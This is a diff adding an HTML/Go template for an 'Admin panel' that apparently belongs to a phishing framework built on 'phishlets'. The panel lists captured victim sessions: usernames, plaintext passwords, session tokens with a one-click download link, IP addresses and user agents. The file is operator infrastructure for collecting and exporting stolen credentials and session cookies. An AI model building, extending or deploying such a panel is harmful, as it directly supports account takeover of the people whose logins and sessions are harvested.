@@ -1,0 +1,58 @@
+<head>
+    <title>Admin panel</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+    <style>
+        td {
+            max-width: 700px !important;
+
+        }
+
+        td p {
+
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow: hidden;
+            padding: 3px 5px;
+        }
+
+    </style>
+</head>
+<div class="container" style="width: 100%;  max-width: none !important;">
+    <div class="notification is-primary">
+        <h1>Admin panel</h1>
+    </div>
+  </div>
+
+<div class="table-container">
+    <table class="table">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Phishlet</th>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Tokens</th>
+                <th>Remote Address</th>
+                <th>Useragent</th>
+                <th>Last Modified</th>
+            </tr>
+        </thead>
+        <tbody>
+            {{range .Sessions}}
+            <tr>
+                <th>{{.ID}}</th>
+                <td>{{.Phishlet}}</td>
+                <td>{{.Username}}</td>
+                <td>{{.Password}}</td>
+                <td>
+                    <a href="data:application/text,{{.Tokens}}" download="{{.Username}}.txt">Link</a>
+                    <p>{{.Tokens}}</p>
+                </td>
+                <td>{{.Remote_addr}}</td>
+                <td>{{.Useragent}}</td>
+                <td>{{.Update_time}}</td>
+            </tr>
+            {{end}}
+        </tbody>
+    </table>
+</div>
